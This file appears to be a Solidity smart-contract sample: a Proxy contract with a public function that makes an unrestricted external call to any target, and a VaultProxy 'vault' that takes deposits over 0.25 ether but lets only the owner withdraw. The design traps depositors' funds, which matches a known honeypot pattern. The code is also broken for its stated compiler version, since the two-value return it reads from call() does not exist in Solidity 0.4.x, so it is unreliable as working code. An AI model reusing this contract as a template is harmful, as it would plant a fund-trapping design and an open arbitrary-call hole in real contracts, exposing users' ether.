pragma solidity ^0.4.23;

contract Proxy {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    function transferOwner(address _owner) public onlyOwner {
        owner = _owner;
    }

    function proxy(address target, bytes data) public payable {
        require(target != address(0), "Invalid target address.");
        bool success;
        bytes memory returnData;
        (success, returnData) = target.call.value(msg.value)(data);
        require(success, "External call failed.");
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public deposits;

    constructor() public payable {
        owner = msg.sender;
        deposit();
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        require(amount > 0 && deposits[msg.sender] >= amount, "Invalid withdrawal amount.");
        deposits[msg.sender] -= amount;
        msg.sender.transfer(amount);
    }
}